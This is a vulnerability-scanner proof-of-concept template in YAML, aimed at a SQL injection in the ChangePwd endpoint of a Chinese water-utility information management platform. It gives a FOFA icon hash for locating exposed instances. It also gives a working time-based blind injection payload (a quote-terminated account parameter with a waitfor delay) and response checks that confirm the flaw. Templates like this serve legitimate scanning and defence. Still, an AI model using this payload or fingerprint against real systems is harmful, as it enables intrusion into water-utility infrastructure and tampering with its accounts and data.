id: poc-yaml-wwkj-changepwd-sqli
info:
  name: 潍微科技-水务信息管理平台 ChangePwd SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 水务信息管理平台
  fofa: icon_hash="-491165370"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"水务信息管理平台")
- method: GET
  path: /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:{{.t1}}%27--+
  expression: status_code == 200 && contains(body,`{"Result":"false","Msg":"用户输入的旧密码错误!"}`)
    && !contains(body,"<") && duration > t1 && duration < t2
transport: http
